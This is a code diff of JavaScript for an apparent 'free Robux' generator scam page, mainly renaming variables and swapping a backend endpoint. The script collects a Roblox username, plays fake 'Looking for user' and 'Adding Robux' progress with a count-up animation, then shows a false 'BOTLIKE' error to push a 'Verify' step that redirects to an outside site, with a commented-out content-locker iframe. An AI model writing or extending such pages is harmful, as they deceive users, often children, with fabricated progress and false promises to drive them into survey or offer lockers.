@@ -1,23 +1,25 @@
-var WANTED, ACTUAL, TUSER;
+// =================================================================
+
+var wantingnew, actually, mainuser;
 
 function FADJ() {
-  var BWIDTH;
+  var b_width;
 
-  BWIDTH = $("body").width();
+  b_width = $("body").width();
 
-  if (BWIDTH > 575.98) {
-    var TBOT, TTOP;
-    TTOP = $(".RECENTROBLOX").outerHeight();
-    TBOT = $(".rob-bot").height();
-    TTB = TBOT + TTOP + 1;
-    $(".FLICK2").css("margin-bottom", TBOT + "px");
+  if (b_width > 575.98) {
+    var tbbott, totoop;
+    totoop = $(".RECENTROBLOX").outerHeight();
+    tbbott = $(".rob-bot").height();
+    TTB = tbbott + totoop + 1;
+    $(".FLICK2").css("margin-bottom", tbbott + "px");
     $(".FLICK2").css("height", "calc(812px - " + TTB + "px)");
   } else {
-    var TBOT, TTOP;
-    TTOP = $(".RECENTROBLOX").outerHeight();
-    TBOT = $(".rob-bot").height();
-    TTB = TBOT + TTOP + 1;
-    $(".FLICK2").css("margin-bottom", TBOT + "px");
+    var tbbott, totoop;
+    totoop = $(".RECENTROBLOX").outerHeight();
+    tbbott = $(".rob-bot").height();
+    TTB = tbbott + totoop + 1;
+    $(".FLICK2").css("margin-bottom", tbbott + "px");
     $(".FLICK2").css("height", "calc(100vh - " + TTB + "px)");
   }
 }
@@ -33,7 +35,7 @@ $(window).resize(function () {
 function SYES() {
   $(".YESNO").fadeOut(1500, function () {
     $(".YESNO").attr("style", "display: none !important;");
-    $("#BTNADD").html("Add <strong>" + WANTED + " free Robux</strong>");
+    $("#BTNADD").html("Add <strong>" + wantingnew + " free Robux</strong>");
     $("#BTNADD").fadeIn(1500);
   });
 }
@@ -65,13 +67,13 @@ function SADDB() {
   };
 
   setTimeout(function () {
-    var FOL = new CountUp("acc777", 0, parseInt(WANTED), 0, 18, options);
+    var FOL = new CountUp("acc777", 0, parseInt(wantingnew), 0, 18, options);
     FOL.start(function () {
       $("#step34").html("<strong>Step 4:</strong> Verify your account!");
       $("#CONS").fadeOut(1500, function () {
         $("#CONS").html(
           "<strong class='reddd'>ERROR! We detected your behavior as BOTLIKE.</strong> Click <strong>Verify</strong> to prove that you are a human and to receive your <strong>" +
-            WANTED +
+            wantingnew +
             "</strong> Robux for free..."
         );
         $("#CONS").fadeIn(1500);
@@ -80,11 +82,11 @@ function SADDB() {
     });
 
     setTimeout(function () {
-      $("#CONS").html("Looking for <strong>" + TUSER + "</strong> user...");
+      $("#CONS").html("Looking for <strong>" + mainuser + "</strong> user...");
     }, 6000);
 
     setTimeout(function () {
-      $("#CONS").html("Adding <strong>" + WANTED + "</strong> Robux...");
+      $("#CONS").html("Adding <strong>" + wantingnew + "</strong> Robux...");
     }, 9000);
 
     setTimeout(function () {
@@ -114,13 +116,13 @@ function SADD() {
   };
 
   setTimeout(function () {
-    var FOL = new CountUp("acc", 0, parseInt(WANTED), 0, 18, options);
+    var FOL = new CountUp("acc", 0, parseInt(wantingnew), 0, 18, options);
     FOL.start(function () {
       $("#step34").html("<strong>Step 5:</strong> Verify your account!");
       $("#CONS").fadeOut(1500, function () {
         $("#CONS").html(
           "<strong class='reddd'>ERROR! We detected your behavior as BOTLIKE.</strong> Click <strong>Verify</strong> to prove that you are a human and to receive your <strong>" +
-            WANTED +
+            wantingnew +
             "</strong> Robux for free..."
         );
         $("#CONS").fadeIn(1500);
@@ -129,11 +131,11 @@ function SADD() {
     });
 
     setTimeout(function () {
-      $("#CONS").html("Looking for <strong>" + TUSER + "</strong> user...");
+      $("#CONS").html("Looking for <strong>" + mainuser + "</strong> user...");
     }, 6000);
 
     setTimeout(function () {
-      $("#CONS").html("Adding <strong>" + WANTED + "</strong> Robux...");
+      $("#CONS").html("Adding <strong>" + wantingnew + "</strong> Robux...");
     }, 9000);
 
     setTimeout(function () {
@@ -143,10 +145,10 @@ function SADD() {
 }
 
 function S1() {
-  TUSER = $("#robname").val();
-  WANTED = $("#robux option:selected").val();
+  mainuser = $("#robname").val();
+  wantingnew = $("#robux option:selected").val();
 
-  if (WANTED == "" || TUSER == "") {
+  if (wantingnew == "" || mainuser == "") {
     alert(
       "Type in your Roblox username and choose how many free Robux you want before clicking continue!."
     );
@@ -154,7 +156,7 @@ function S1() {
     $(".S1B").prop("disabled", true);
 
     $.ajax({
-      url: "flick.php?u=" + TUSER,
+      url: "checking.php?u=" + mainuser,
       success: function (data) {
         if (!data.includes("FLICKERROR")) {
           try {
@@ -207,7 +209,7 @@ function S1() {
   }
 }
 
-function human_verification() {
+function humanverification() {
   // Show the loader
   // document.getElementById("iframe-overlay").innerHTML =
   //   '<iframe id="lockeriframe" src="https://verifyhere.xyz/cl/i/5k8dm1" frameborder="0" class="second-row"></iframe>';
@@ -216,6 +218,5 @@ function human_verification() {
   // setTimeout(function () {
   //   document.getElementById("iframe-overlay").style.display = "flex"; // Show iframe overlay
   // }, 100);
-
-  window.location.href="https://freerobloxintermediate.onrender.com";
+  window.location.href = "https://freerobloxintermediate.onrender.com";
 }
